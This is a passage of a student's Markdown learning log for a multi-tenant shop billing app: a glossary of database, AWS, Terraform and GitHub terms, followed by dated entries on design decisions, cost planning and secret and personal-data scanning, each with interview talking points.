| RLS | Row-Level Security: PostgreSQL policies that decide which rows a query is allowed to see |
| RPO / RTO | Recovery Point Objective (max data you can lose) / Recovery Time Objective (max time to recover) |
| Ruleset | GitHub's rules for branches (require a PR, block force-push…), the newer form of branch protection |
| SIGTERM | The polite "please stop" signal; `docker stop` sends it, then kills the process after 10 s |
| SPA | Single-page app: the browser loads the app once and then only exchanges data with the server |
| SPA fallback | The web server answers any unknown path with `index.html`, so the app's router can show the right page after a refresh |
| Squash merge | All of a pull request's commits combined into one commit on `main` |
| Supply-chain attack | Attacking an app through something it depends on, e.g. publishing a poisoned version of a popular npm package |
| TDD | Test-driven development: write a failing test, watch it fail, write the least code that passes, then tidy up |
| Tenant | One customer business in a multi-tenant system |
| Permissive vs restrictive policy | Permissive RLS policies are ORed (any one lets a row through); restrictive ones are ANDed on top (each must pass) |
| Materialized view | A query whose result is stored as a table and refreshed on demand; RLS never applies to it |
| BYPASSRLS | A role attribute that skips every RLS policy; superusers have it implicitly. Backups need it, the app must never have it |
| Required status check | A CI job that must pass before GitHub lets a pull request merge; set in the branch ruleset |
| Script injection (Actions) | Writing `${{ github.event... }}` inside `run:` pastes user-typed text into a shell script, which then runs it; pass it through `env:` instead |
| SHA pinning | Referring to an action by its full commit hash instead of a tag, so its code can't change without a visible edit |
| Smoke test | A quick check that the real built thing starts and answers, before deeper testing or a deploy |
| Testcontainers | A library that starts real throwaway services (here PostgreSQL) in Docker for a test run |
| Text shaping | Turning letters into correctly joined glyphs; Hindi (Devanagari) needs it for conjuncts like क्ष |
| Type-aware linting | Lint rules that use the TypeScript compiler's type information, e.g. "this promise is never awaited" |
| Volume (Docker) | Storage kept outside a container, so data survives when the container is removed |
| WCAG contrast ratio | How much lighter one colour is than another, from 1:1 to 21:1; AA needs 4.5:1 for normal text and 3:1 for edges and focus rings |
| Workspace (pnpm) | The set of packages in a monorepo that pnpm installs and links together |
| UUIDv7 | A UUID that starts with a timestamp, so new IDs sort after old ones and inserts append to the index; PostgreSQL 18 has `uuidv7()` built in |
| FORCE ROW LEVEL SECURITY | Makes RLS apply to the table's owner too; without it, owners silently skip every policy |
| `set_config(name, value, true)` | Sets a custom setting such as `app.business_id` for the current transaction only; unlike `SET`, it takes query parameters |
| Append-only table | A table rows can be added to but never changed or removed; here enforced by the database role's grants, not by code |
| `REVOKE` | SQL that takes a privilege away from a role, e.g. `REVOKE UPDATE ON entry_log FROM app_runtime` |
| `SECURITY DEFINER` | A function that runs with its owner's rights instead of the caller's; a way around RLS and grants if the wrong role can call it |
| `security_invoker` (views) | Makes a view check its base tables' rights and RLS as the person querying, not as the view's owner (PostgreSQL 15+) |
| `has_any_column_privilege` | True if a role has a privilege on the whole table or on any one column; `has_table_privilege` misses column-level grants |
| Effective privileges | What a role can really do: its own grants, plus PUBLIC's, plus those of every role it belongs to |
| Recovery key | A one-time secret shown at signup and kept on paper, which can reset the password when every other way in is lost |
| DLT (India) | TRAI's Distributed Ledger Technology registry: businesses must register sender IDs and message templates before sending commercial SMS, OTPs included |
| Root user (AWS) | The account's email login: it can do anything, including closing the account, and no policy can limit it; MFA on, no access keys, used only for account-level tasks |
| IAM user / group / role | A user is a long-lived identity (a person or program) in one account; a group gives several users the same policies; a role has no password and is *assumed* for short-lived credentials |
| MFA | Multi-factor authentication: a second proof (authenticator code or passkey) on top of the password |
| AWS Organizations | Groups several AWS accounts under one management account; joining one upgrades a Free plan account to Paid |
| IAM Identity Center | AWS's single sign-on: one login for many accounts, giving short-lived credentials (`aws sso login`); its account-access setup needs Organizations |
| AWS project (new experience) | Since 2026-09, new AWS customers sign in with Google/GitHub/Apple/Amazon into a "project": an AWS account AWS sets up for you, with a team page instead of IAM users and one assigned Region on the Free plan |
| Advanced features (AWS) | The switch that turns a new-experience project into a full AWS Organization with every Region; needs the Paid plan and can't be undone |
| AWS Budgets | Free alerts when cost (or forecast cost) passes a threshold; on the Free plan they only warn, they can't stop anything. Credits count as negative cost unless you filter them out |
| Region | A geographic group of AWS data centres (`ap-south-1` Mumbai, `ap-southeast-2` Sydney); most resources live in one Region, and distance adds latency |
| Exception filter (NestJS) | The last stop for an error thrown while handling a request: it decides the HTTP answer and what gets logged. Ours is `UnhandledErrorFilter` |
| `uncaughtException` / `unhandledRejection` | Node's process-level events for an error nothing caught: a throw (or an `error` event with no listener), and a rejected promise nobody awaited |
| `AggregateError` | One error that wraps several, in `.errors`; Node throws it when every address of a host refuses the connection, with an empty message of its own |
| Checked-out connection | A pool connection handed to code for a while (a whole transaction), as opposed to an idle one waiting in the pool |
| `aws login` | AWS CLI command (v2.32+) that turns a console sign-in into temporary credentials for a named profile: 12 hours, renewed for up to 90 days |
| `allowed_account_ids` | Terraform AWS provider setting: refuse to run unless the credentials belong to one of these accounts |
| AWS Pricing API | `aws pricing get-products`: AWS's price list as data, filtered by service, Region and attributes; the same numbers as the Pricing Calculator |
| Elastic IP | A fixed public IPv4 address you keep; billed every hour, even while the server is stopped |
| EventBridge Scheduler | AWS's cron service: calls an AWS API on a schedule (ours stops EC2 and RDS nightly) through a role |
| DuckDNS | A free dynamic-DNS service: a subdomain whose IP the server updates through a URL with a token |
| Write-only argument (Terraform) | An argument such as `password_wo` that Terraform sends to the provider but never stores in state or plan files |
| Remote state (Terraform) | The state file kept in shared storage (an S3 bucket) instead of on one laptop, with a lock so two runs can't write at once |
| Ephemeral resource (Terraform) | A value that exists only during a run, such as a generated password; never written to state or plan files |
| Dependency lock file | `.terraform.lock.hcl`: the exact provider versions and their checksums, committed so every machine installs the same ones |
| Filesystem mirror (Terraform) | A local folder Terraform installs providers from, instead of downloading them from the registry |
| Session Manager | AWS Systems Manager feature: a shell on a server through its agent's outbound connection, with no SSH key or open port |
| IMDSv2 | The EC2 metadata service's token-based version; a plain forwarded request can't read the instance's credentials |
| Burstable instance (CPU credits) | `t` types earn credits while idle and spend them under load; `standard` slows down at zero credits, `unlimited` bills for the extra |
| Security group | A stateful firewall on an AWS resource: you allow traffic in, and replies get out by themselves |
| Code page (cp1252) | The character set the Windows console uses by default; it has no `→`, so printing one crashes a program unless it runs in UTF-8 mode |
| Format character (Unicode `Cf`) | An invisible character that changes how text displays, such as a zero-width space or a right-to-left override |
| Export condition (`source`) | A key in a package's `exports` that lets a tool pick another entry point, here the TypeScript source instead of the build |
| PHC string | The standard text form of a password hash: algorithm, version, parameters, salt and hash in one string |
| cloud-init | The first-boot setup script Ubuntu cloud images run from the instance's user data |
| Conditional write (S3) | An upload with `If-None-Match: *` succeeds only if the key doesn't exist; a bucket policy can require it, so files can't be overwritten |
| Optimistic locking | Each row carries a version; a save sends the version it read and is refused (`409`) if someone saved in between |
| Git worktree | A second checkout of the same repository in another folder, on its own branch, sharing one `.git` |
| InsufficientInstanceCapacity | AWS has no spare servers of that type in that zone right now; a stopped instance doesn't reserve its capacity |
| Immutable OIDC subject | GitHub's token subject with numeric IDs next to the names (`repo:owner@id/name@id:…`), so a re-created repository of the same name can't match a trust policy |
| GitHub environment variable | A variable set on one environment (`gh variable set --env demo`); it overrides a repository variable of the same name for jobs in that environment |
| GitHub environment | A named deploy target in a repository with its own secrets, variables and protection rules (required reviewers, allowed branches); a job that names it waits for those rules |
| Saved Terraform plan | `terraform plan -out=file`, then `terraform apply file`: applies exactly what was reviewed, and refuses if the state changed since |
| `lock_timeout` | A PostgreSQL setting: how long a statement waits for a row or table lock before giving up with an error |
| Weighted average cost | Stock value divided by quantity, recomputed on every stock-in; used to value write-offs and profit |

---

## Log

Entry format:

```markdown
### YYYY-MM-DD — Short title `#tag`
- **What happened:**
- **Why / what I learned:**
- **Say it in an interview:**
- **Follow-ups to expect:**
```

### 2026-10-29 — Studied the competition before designing `#product`
- **What happened:** Before writing requirements, compared the idea with Vyapar, myBillBook and Khatabook, plus AI shop assistants such as Khata Bhai.
- **Why / what I learned:** The features alone aren't unique. The edge has to be depth and correctness: staff + advances + udhaar + permissions + an AI that respects permissions, all in one well-built app.
- **Say it in an interview:** "I checked the market first. Since the feature list existed already, I competed on correctness and depth — a few polished modules beat many half-built ones."
- **Follow-ups to expect:** Who are the users? What would make a shop switch from Vyapar?

### 2026-10-29 — Requirements live in files, with DECIDED / DRAFT labels `#requirements` `#process`
- **What happened:** Moved all requirements from a chat into `docs/requirements/`, one file per module, each marked DECIDED or DRAFT, with a Change log. The repo is the single source of truth.
- **Why / what I learned:** Chats get lost or compacted; files in git have history. Labels stop half-formed ideas from being built as if they were agreed.
- **Say it in an interview:** "Every requirement has a status and a change log, so I always know what's agreed and why it changed."
- **Follow-ups to expect:** How do you handle a requirement change mid-build?

### 2026-10-29 — One app with business-type presets, not five apps `#product` `#architecture`
- **What happened:** Decided (Module 00) that kirana, medical, clothing, electronics and hardware are presets that switch features on, inside one app.
- **Why / what I learned:** This is the feature-flag idea: one codebase, behaviour controlled by settings. Mixed shops can switch on extra features.
- **Say it in an interview:** "Business types are configuration, not code branches. One codebase serves all five."
- **Follow-ups to expect:** How do you store type-specific item fields? (JSONB / optional columns — decided when building Module 01.)

### 2026-10-29 — Git and GitHub set up `#git` `#github`
- **What happened:** First commit "Import requirements from planning chat", renamed `master` → `main`, created a private GitHub repo and pushed.
- **Why / what I learned:** The requirements were safe in the cloud before any code existed. `main` is GitHub's default branch name.
- **Say it in an interview:** "I pushed the requirements on day one, so the laptop was never the only copy."
- **Follow-ups to expect:** What's your branching strategy? (Branch protection + PRs come in Phase 0, DevOps stage 1.)

### 2026-10-29 — GitHub login: Credential Manager vs `gh` `#github` `#gotcha`
- **What happened:** I had trouble logging in to GitHub. `gh auth login` is interactive, so Claude's terminal can't answer its prompts. The simpler route: Git for Windows ships Git Credential Manager, which opens a browser sign-in on the first `git push`.
- **Why / what I learned:** Git over HTTPS needs a credential. A credential helper stores it safely, and interactive commands must be run by me.
- **Say it in an interview:** "Git doesn't use your GitHub password over HTTPS any more; it uses a token or OAuth through a credential helper."
- **Follow-ups to expect:** HTTPS vs SSH for git? Personal access tokens?

### 2026-10-29 — Branch protection on a private repo needs GitHub Pro `#github` `#gotcha`
- **What happened:** While planning DevOps stage 1, found that GitHub Free only offers branch protection on public repos. Private repos need GitHub Pro, which students get free through the GitHub Student Developer Pack (along with cloud credits).
- **Why / what I learned:** Check plan limits before designing a workflow around a feature.
- **Say it in an interview:** "`main` is protected: changes only arrive through pull requests with green CI."
- **Follow-ups to expect:** What do branch protection rules enforce? (Required reviews and status checks; no force-push.)

### 2026-10-29 — The project folder is inside OneDrive `#gotcha` `#git`
- **What happened:** Noticed the repo sits in a OneDrive-synced Desktop folder.
- **Why / what I learned:** OneDrive syncing files while git writes them can corrupt `.git`, and `node_modules` (tens of thousands of files) slows sync badly. GitHub is the backup, not OneDrive. Plan: move it to a plain `projects` folder in my user folder, outside OneDrive.
- **Say it in an interview:** (small, but shows care) "I kept the repo out of cloud-sync folders: git is the version control, GitHub is the backup."
- **Follow-ups to expect:** —

### 2026-10-29 — Turned vague requirements into measurable targets `#requirements` `#devops`
- **What happened:** Confirmed the 7 non-functional requirements and gave them numbers: RPO 5 min, RTO 1 hour, scan < 200 ms, bill save < 1 s.
- **Why / what I learned:** "Fast" and "safe" can't be tested; numbers can. RPO and RTO are the standard way to state data-safety goals.
- **Say it in an interview:** "My top requirement was zero data loss, so I defined it as RPO 5 minutes and RTO 1 hour, and chose a database setup that meets it."
- **Follow-ups to expect:** How do you prove your backups work? (Monthly restore drill — an untested backup doesn't count.)

### 2026-10-29 — Online-first instead of offline billing `#architecture` → ADR 0001
- **What happened:** Chose online-first for v1, with the data designed so offline can be added later.
- **Why / what I learned:** Offline sync across several counters is where stock goes wrong and data gets lost. UUIDs created at the source and idempotency keys keep the door open.
- **Say it in an interview:** "I traded availability during outages for correctness, because correctness was the top requirement, and designed the IDs so offline is possible later."
- **Follow-ups to expect:** How would you add offline? (Local store per counter, a separate invoice series per counter, sync of append-only events.)

### 2026-10-29 — Idempotency keys `#backend` `#architecture`
- **What happened:** Every "create" request from the screen (bill, payment) carries a unique key. A retry with the same key returns the first result.
- **Why / what I learned:** Networks fail *after* the server saved but *before* the reply arrived. Without a key, the retry makes a second bill.
- **Say it in an interview:** "Retries are only safe if the operation is idempotent; payment APIs like Stripe use the same idea."
- **Follow-ups to expect:** Where do you store keys and for how long?

### 2026-10-29 — Chose TypeScript everywhere `#architecture` → ADR 0002
- **What happened:** Compared TypeScript (NestJS), Python (FastAPI) and Java (Spring Boot) backends.
- **Why / what I learned:** The safety requirements come from PostgreSQL in every option. So the language decides speed of building, and TypeScript lets the counter screen and server share types, validation and GST math.
- **Say it in an interview:** "The database gives me correctness; the language gives me speed. Shared code means a GST rule exists once."
- **Follow-ups to expect:** Node is single-threaded — how do you handle heavy work? (A separate worker process.)

### 2026-10-29 — Single-page app, not Next.js `#frontend` → ADR 0003
- **What happened:** Chose React + Vite as a single-page app.
- **Why / what I learned:** Server-side rendering helps SEO and first load for public pages. A logged-in counter app has neither need, and SSR adds a server to run.
- **Say it in an interview:** "I picked the tool for the job: no SEO need, so no server rendering — the app is static files on a CDN."
- **Follow-ups to expect:** When *would* you use Next.js?

### 2026-10-29 — Modular monolith, not microservices `#backend` → ADR 0004
- **What happened:** One NestJS app split into modules that mirror the requirement modules (00–09), with one deployable image and two entry points (api, worker).
- **Why / what I learned:** Microservices solve team-scaling problems I don't have, and break the single transaction a bill needs.
- **Say it in an interview:** "Microservices are an organisational tool. For one developer and one database, a modular monolith gives the same boundaries without distributed transactions."
- **Follow-ups to expect:** How do you stop modules reaching into each other's tables?

### 2026-10-29 — PostgreSQL + Drizzle `#database` → ADR 0005
- **What happened:** Chose PostgreSQL, with Drizzle ORM and SQL migration files in git.
- **Why / what I learned:** Needed transactions, row locks, Row-Level Security, constraints and fuzzy search. MongoDB's model fits documents, not bills with lines and ledgers. Drizzle stays close to SQL, so locks and policies are easy.
- **Say it in an interview:** "Relational data with strict money rules belongs in a relational database with real transactions."
- **Follow-ups to expect:** Prisma vs Drizzle? How do you run migrations without downtime?

### 2026-10-29 — Multi-tenancy with Row-Level Security `#database` `#security` → ADR 0006
- **What happened:** Compared database-per-business, schema-per-business, and shared tables with `business_id` + RLS. Chose shared + RLS.
- **Why / what I learned:** Shared tables are cheap and simple, and RLS makes the database enforce separation even if code has a bug. Gotchas: table owners and superusers bypass RLS, so the app must connect as a separate role. Use `set_config('app.business_id', $1, true)` (transaction-local), because `SET` can't take query parameters.
- **Say it in an interview:** "Defense in depth: my code filters by business, and the database filters again, so one forgotten `WHERE` can't leak data."
- **Follow-ups to expect:** What about connection pooling with session variables? (Transaction-local settings work with transaction pooling.)

### 2026-10-29 — "No deletes" is enforced by the database, not just code `#database` → ADR 0007
- **What happened:** The app's database role gets no `DELETE` permission on business tables, and only `INSERT` + `SELECT` on the entry log. Stock is a ledger of movements, not a number that gets overwritten.
- **Why / what I learned:** Code has bugs, so the last line of defense should be the database. Corrections are reversals with a reason, like accounting.
- **Say it in an interview:** "Even a bug in my code can't delete a bill, because the database user doesn't have the permission."
- **Follow-ups to expect:** How do you handle a privacy request to erase a customer? (Anonymise the personal fields, keep the financial record — to decide later.)

### 2026-10-29 — Invoice numbers under GST `#gst` `#database`
- **What happened:** Learned that GST rules (CGST Rule 46) require invoice numbers to be consecutive and unique per financial year, in one or more series. Chose a counter row per branch per financial year, locked inside the bill transaction.
- **Why / what I learned:** `MAX(number) + 1` breaks with two counters (both read the same max). A locked counter row gives no duplicates and no gaps. Lock stock rows in a fixed order (by item ID) so two bills can't deadlock.
- **Say it in an interview:** "Sequential numbering under concurrency is a classic race condition; I solved it with a row lock inside the same transaction."
- **Follow-ups to expect:** Why not a database sequence? (Sequences skip numbers when a transaction rolls back — gaps aren't allowed.)

### 2026-10-29 — Money as integer paise `#money` → ADR 0008
- **What happened:** All amounts are whole paise in a `bigint`, tax rates are basis points (18% = 1800), and rounding lives in one shared, tested module.
- **Why / what I learned:** `0.1 + 0.2 = 0.30000000000000004` in floating point. JavaScript numbers are exact up to 2^53, which is about ₹90 lakh crore in paise, so plain numbers are safe.
- **Say it in an interview:** "I never let a float touch money. Integers in the smallest unit, explicit rounding rules in one place."
- **Follow-ups to expect:** How do you split ₹100 three ways? (Allocate the leftover paisa deliberately.)

### 2026-10-29 — Sessions instead of JWTs `#security` → ADR 0009
- **What happened:** Logins create a session row in PostgreSQL. The browser holds only a random token in an httpOnly cookie. Passwords are hashed with Argon2id.
- **Why / what I learned:** Needed instant revocation (staff leaves, owner auto-lock, permission change). JWTs are hard to revoke before expiry.
- **Say it in an interview:** "JWTs are great for stateless services; for a shared shop computer where access must stop instantly, server sessions are the safer choice."
- **Follow-ups to expect:** CSRF with cookies? Where should a JWT be stored if used?

### 2026-10-29 — Outbox pattern for WhatsApp, jobs in PostgreSQL `#backend` → ADR 0010
- **What happened:** Background jobs run in pg-boss (a queue stored in PostgreSQL). Messages are written to an outbox in the same transaction as the action, then sent by the worker. A real WhatsApp Cloud API integration uses Meta's free test number, plus an in-app Outbox page.
- **Why / what I learned:** Sending a message directly inside a request either loses it (crash after commit) or sends it for a rolled-back action. The outbox fixes both. Using PostgreSQL as the queue avoids running Redis.
- **Say it in an interview:** "Fewer moving parts: the database I already back up is also my queue."
- **Follow-ups to expect:** At-least-once delivery means duplicates — how do you handle them? (Idempotent sending by message ID.)

### 2026-10-29 — AWS cost traps `#cloud` `#cost` → ADR 0011
- **What happened:** First plan: ECS Fargate + load balancer + RDS + CloudFront, assuming ₹1,000/month.
- **Why / what I learned:** Cost traps for students: a NAT gateway (~$35–45/month just to exist), EKS (~$73/month for the control plane), public IPv4 addresses ($0.005/hour each since 2024), load balancers, and forgotten environments. Secrets Manager charges per secret per month; SSM Parameter Store standard parameters are free.
- **Say it in an interview:** "Because everything is Terraform, I can destroy and recreate an environment in minutes, so it only uses credits while it runs."
- **Follow-ups to expect:** How do you avoid a NAT gateway? (Public subnet with a tight security group, or VPC endpoints.)

### 2026-10-29 — Redesigned hosting for a ₹0 budget `#cloud` `#cost` `#architecture` → ADR 0011
- **What happened:** I told Claude I have no monthly budget and will use an AWS Free plan account. We read the official rules: up to $200 credits over 6 months, "You won't be charged unless you convert to a Paid plan", and the account closes after 6 months or when credits run out. The Fargate + load balancer design (~$45–55/month) would have closed the account in about 4 months. New design: one EC2 server running Docker Compose (Caddy + api + worker) + RDS with point-in-time restore + a nightly `pg_dump` to S3, about $25–35/month.
- **Why / what I learned:** Design to the real constraint. Keep the part that protects the top requirement (managed backups) and cut what only adds scale (load balancer, ECS). Time the 6-month window to placement season. Because the demo data is a seed and the infrastructure is Terraform, the account closing loses nothing.
- **Say it in an interview:** "I sized the architecture to a zero budget without giving up point-in-time restore, and because it's all containers and Terraform, scaling to ECS behind a load balancer is an infrastructure change, not an app change."
- **Follow-ups to expect:** What breaks first if traffic grows 100×? (The single server: add a load balancer and more instances, or move to ECS.) Why not run PostgreSQL on the EC2 to save more? (Then I'd own backups and PITR, the riskiest thing to self-manage.)

### 2026-10-29 — Checked the laptop before installing anything `#devops` `#gotcha`
- **What happened:** Claude checked what was installed: Git, GitHub CLI, Node 24 (LTS) and VS Code were there; pnpm, Docker, WSL and Terraform were missing. Two gotchas: Windows reported "virtualization disabled", but that's what it says when a hypervisor is *already* running (it was enabled). And an `aws` command existed but was a broken old pip install of AWS CLI v1.
- **Why / what I learned:** Docker Desktop on Windows runs Linux containers inside WSL 2, so WSL comes first. Verify tools by running them, not by checking that the command exists.
- **Say it in an interview:** "Before setting up, I audited the machine: what's installed, which versions, what's broken."
- **Follow-ups to expect:** What is WSL 2? Why do Linux containers need a Linux kernel?

### 2026-10-29 — "LF will be replaced by CRLF" warnings `#git` `#gotcha`
- **What happened:** Git on Windows warned that line endings would be converted, because Windows uses CRLF and Linux uses LF. Planned fix in P0.1: a `.gitattributes` file with `* text=auto eol=lf`.
- **Why / what I learned:** The code runs in Linux containers and on Linux CI. Mixed line endings break shell scripts (`/bin/sh^M: bad interpreter`) and create noisy diffs.
- **Say it in an interview:** "I pinned line endings in `.gitattributes` so Windows and Linux machines produce identical files."
- **Follow-ups to expect:** What does `core.autocrlf` do?

### 2026-10-29 — Rewrote commit messages and force-pushed safely `#git`
- **What happened:** Both commits had an AI co-author line, and I wanted the history to show only me. Removed it with `git filter-branch --msg-filter`, then pushed with `git push --force-with-lease=main:<old commit>`. Added a rule to `CLAUDE.md`: no AI attribution in commits.
- **Why / what I learned:** Rewriting history changes every commit hash after the change, so the remote must be force-updated. `--force-with-lease` only overwrites if the remote still points where I expect, so it can't wipe someone else's newer work the way plain `--force` can. Only do this on branches nobody else uses. Modern tool: `git filter-repo`.
- **Say it in an interview:** "I never use plain `--force`; `--force-with-lease` checks the remote first, and I only rewrite history on branches I own."
- **Follow-ups to expect:** `git revert` vs `git reset` vs rewriting history? Why not rewrite a shared `main`?

### 2026-10-29 — How I (and Claude) get into AWS: SSO, not access keys or console clicking `#cloud` `#security` `#devops`
- **What happened:** I asked whether Claude would work in AWS through the browser. Plan: I create the account and an admin login in IAM Identity Center in the browser, once. After that, `aws sso login` opens the browser for approval and gives my laptop temporary credentials. Claude runs `aws` and `terraform` commands in my terminal with those credentials, always `terraform plan` first and `apply` only after I approve.
- **Why / what I learned:** Clicking in the console isn't repeatable or reviewable; infrastructure as code is. SSO credentials expire after a few hours, so there are no long-lived access keys to leak, and access stops when the session ends. The root user is only for account-level tasks, protected by MFA.
- **Say it in an interview:** "Nobody, including my AI assistant, has permanent AWS keys. Everything goes through short-lived SSO sessions and Terraform plans I review."
- **Follow-ups to expect:** What's the difference between an IAM user, a role and Identity Center? Why never use the root account?

### 2026-10-29 — One domain for app and API, so cookies work `#security` `#frontend` `#gotcha` → ADR 0011
- **What happened:** The first plan served the web app from CloudFront and the API from a different host. With session cookies (ADR 0009) that breaks: the browser treats the API as another site and won't send `SameSite` cookies on its requests. Fixed by having Caddy serve the web app *and* forward `/api` on one domain. Locally, Vite's dev server proxies `/api` the same way.
- **Why / what I learned:** Same-origin hosting avoids both CORS setup and cross-site cookie problems.
- **Say it in an interview:** "Cookie-based auth shaped my hosting: app and API share one origin, so there's no CORS and no third-party cookie issue."
- **Follow-ups to expect:** What's the difference between same-site and same-origin? What does `SameSite=Lax` allow?

### 2026-10-29 — GitHub Actions with OIDC `#devops` → ADR 0012
- **What happened:** CI on every push/PR. After a merge, the deploy runs through AWS Systems Manager on the EC2 server (no SSH port open), with a health check and rollback to the previous image. AWS access uses OIDC, so no keys are stored in GitHub.
- **Why / what I learned:** Long-lived cloud keys in CI are a top cause of leaks. Jenkins would need its own server to run and patch. GitHub plan gotcha: on private repos, deployment approvals (required reviewers) need GitHub Enterprise; on public repos they're free.
- **Say it in an interview:** "My pipeline has no stored AWS secrets; each run gets short-lived credentials for one role."
- **Follow-ups to expect:** How do you roll back a bad deploy?

### 2026-10-29 — Testing against a real PostgreSQL `#testing` → ADR 0013
- **What happened:** Vitest for business rules, Testcontainers for integration tests on real PostgreSQL, and Playwright for end-to-end flows.
- **Why / what I learned:** Locks, concurrency and RLS can't be tested with mocks or SQLite. NestJS defaults to Jest; using Vitest needs the SWC plugin so decorators keep their metadata.
- **Say it in an interview:** "I wrote a test where two simulated counters sell the last unit at once — that bug only shows against the real database."
- **Follow-ups to expect:** Test pyramid? How long does your CI take?

### 2026-10-29 — Hindi PDFs need text shaping; one-key printing `#frontend` `#gotcha` → ADR 0014
- **What happened:** Chose browser printing with print stylesheets (80 mm, 58 mm, A4), Chrome's `--kiosk-printing` flag for no print dialog, and headless Chromium for PDFs.
- **Why / what I learned:** Devanagari letters combine (क + ष = क्ष). Many JavaScript PDF libraries don't do this "text shaping" and print broken Hindi. A browser engine does it right.
- **Say it in an interview:** "Supporting Hindi was more than translations: I had to pick a PDF pipeline that shapes Devanagari correctly."
- **Follow-ups to expect:** How do barcode scanners work with a web app? (They act as a keyboard.)

### 2026-10-29 — AI uses tool calling, not text-to-SQL `#ai` → ADR 0015
- **What happened:** The assistant may only call a fixed set of my own functions, which run with the asking user's permissions. It never writes SQL.
- **Why / what I learned:** Model-written SQL can bypass staff permissions (salaries, profit) and produce silently wrong joins. Functions are testable, and every number comes from them.
- **Say it in an interview:** "The model decides *which* question to ask; my code decides *what it's allowed to see* and computes the numbers."
- **Follow-ups to expect:** How do you evaluate the AI's accuracy? (An eval set of questions with known answers from demo data.)

### 2026-10-29 — A Claude subscription is not an API key `#ai` `#cost` `#gotcha`
- **What happened:** I planned to use my Claude subscription for the app's AI. Learned that Pro/Max subscriptions cover claude.ai and Claude Code only. An app needs an API key from the Claude Console, billed separately (prepaid credits, with a spend limit).
- **Why / what I learned:** Consumer subscriptions and developer APIs are different products. Rough cost: a question of ~10k input + 1k output tokens costs about $0.0015 on Haiku 5.5, $0.03 on Sonnet 5.5, or $0.06 on Opus 5.5 (prices cached 2026-10-06). A few dollars of credit covers a demo.
- **Say it in an interview:** "I estimated cost per question before building and put a hard monthly cap in the app."
- **Follow-ups to expect:** How would you cut AI cost? (Prompt caching, smaller model for simple questions.)

### 2026-10-29 — Demo data generated through the app's own code `#testing` → ADR 0016
- **What happened:** A seed script with a fixed random seed builds a realistic demo shop by calling the same services the app uses. A first version comes at the end of Phase 1.
- **Why / what I learned:** Inserting rows directly can create impossible states (stock not matching movements). Going through services makes the demo obey every rule and doubles as a big test.
- **Say it in an interview:** "My demo data is reproducible and rule-abiding because it's created by the real business logic."
- **Follow-ups to expect:** How do you reset the demo?

### 2026-10-29 — GST treats branches in different states as separate businesses `#gst` `#gotcha`
- **What happened:** Noticed that moving stock between branches with different GSTINs is a taxable supply under GST (distinct persons), which needs a tax invoice with IGST, not just a stock movement. Added it as an open question to Module 01.
- **Why / what I learned:** Domain rules can turn a "simple" feature into an accounting event. Check the law before modelling it.
- **Say it in an interview:** "Branch transfers looked like an inventory feature, but across states they're a GST invoice. I caught it in design, not in production."
- **Follow-ups to expect:** —

### 2026-10-29 — Found contradictions in the requirements before building `#requirements`
- **What happened:** In the kickoff, flagged that (1) medical costing (oldest-first) and billing order (expiry-first) can pick different batches, (2) "one shared counter computer" vs "several counters", and (3) Module 06 asks whether the owner's actions are logged although Module 00 already says every action is. Each is now an open question in its module file.
- **Why / what I learned:** Reading requirements critically before coding is cheaper than fixing code later.
- **Say it in an interview:** "I review requirements for contradictions first; it's the cheapest bug to fix."
- **Follow-ups to expect:** —

### 2026-10-30 — "failed to connect to the docker API" `#devops` `#gotcha`
- **What happened:** The first `docker` command of the session failed with `failed to connect to the docker API at npipe:////./pipe/dockerDesktopLinuxEngine`. Docker Desktop wasn't running. Started it and waited until `docker info` answered (about a minute).
- **Why / what I learned:** Docker is client–server. The `docker` command is only a client that sends requests to the Docker engine (the daemon). On Windows the engine runs inside a WSL 2 Linux VM that Docker Desktop starts. No engine, nobody to answer.
- **Say it in an interview:** "The Docker CLI is just an API client; the daemon does the work. The same CLI can drive a remote engine through `DOCKER_HOST`."
- **Follow-ups to expect:** Why do Linux containers need a Linux kernel on Windows? Container vs virtual machine?

### 2026-10-30 — Scanned the whole git history for secrets before going public `#security` `#git` `#devops` → ADR 0017
- **What happened:** Ran gitleaks over every commit (`--log-opts="--all"`) inside Docker, so nothing had to be installed. It scanned 5 commits, not 3, because the 10-29 history rewrite left the old commits under `refs/original/` (`git filter-branch` keeps a backup there). No leaks. Also searched all history for emails and phone numbers: none.
- **Why / what I learned:** Git keeps everything ever committed. A secret removed in a later commit is still in history, and making a repo public publishes all of it. If a secret leaks, revoke it first: deleting the commit doesn't remove clones, forks or GitHub's copies.
- **Say it in an interview:** "Before going public I scanned the full history, not just the current files. Now GitHub push protection blocks known token formats at `git push`, and gitleaks runs in CI."
- **Follow-ups to expect:** How do you remove a secret from history? (Rotate it first; then `git filter-repo`, force-push, and ask GitHub to purge cached views.) Push protection vs gitleaks? (Push protection matches known provider token formats with few false alarms; gitleaks adds broader patterns and runs anywhere, including CI.)

### 2026-10-30 — My commit email becomes public `#github` `#security` `#gotcha`
- **What happened:** Every commit stores the author's name and email, and on a public repo anyone can read them (add `.patch` to a commit's URL). Mine used my personal Gmail. Switched this repo to GitHub's noreply address (`144018864+aryangupta1811@users.noreply.github.com`) and turned on *Block command line pushes that expose my email*. The 3 commits already on GitHub keep the Gmail, because GitHub keeps old commits reachable by ID even after a rewrite.
- **Why / what I learned:** Bots scrape public commits for email addresses. Privacy choices are cheapest before publishing. GitHub links a commit to a profile by matching its email to one on the account, and the noreply address counts.
- **Say it in an interview:** "Commit metadata is public data, so I commit with GitHub's noreply address."
- **Follow-ups to expect:** Author vs committer? How would you sign commits? (GPG or SSH signing, shown as "Verified".)

### 2026-10-30 — Secret scanners don't find personal data `#security` `#git`
- **What happened:** Once the repo was public, I asked for a check that nothing private gets committed. gitleaks scanned the staged changes and all 6 commits: no secrets. But gitleaks only knows secret formats (API keys, tokens, private keys), so a separate `git grep` searched for emails, phone numbers, Aadhaar/PAN/GSTIN numbers and home-folder paths. The first run of the search found nothing, although an old `C:\…` home-folder path in this log should have matched: the pattern's backslashes had been mangled on the way to `git grep`. Run exactly as documented, it caught that path, which I then removed. Both checks are now steps in `/end-session` and a rule in `CLAUDE.md`.
- **Why / what I learned:** Secrets (credentials) and personal data (PII) are different problems that need different tools. Automated checks at several points (before commit, at push, in CI) catch more than relying on memory. And a check that has never caught anything proves nothing: test it on a known bad example first, like a test that must fail before it passes.
- **Say it in an interview:** "I check for secrets and personal data separately, before every commit; push protection and CI are the safety nets behind that."
- **Follow-ups to expect:** What's PII? How would you handle real customer data in a demo? (Never; demo data is generated with made-up values.)

### 2026-10-30 — `gh auth login`: the code is in the terminal, not on my phone `#github` `#security` `#gotcha`
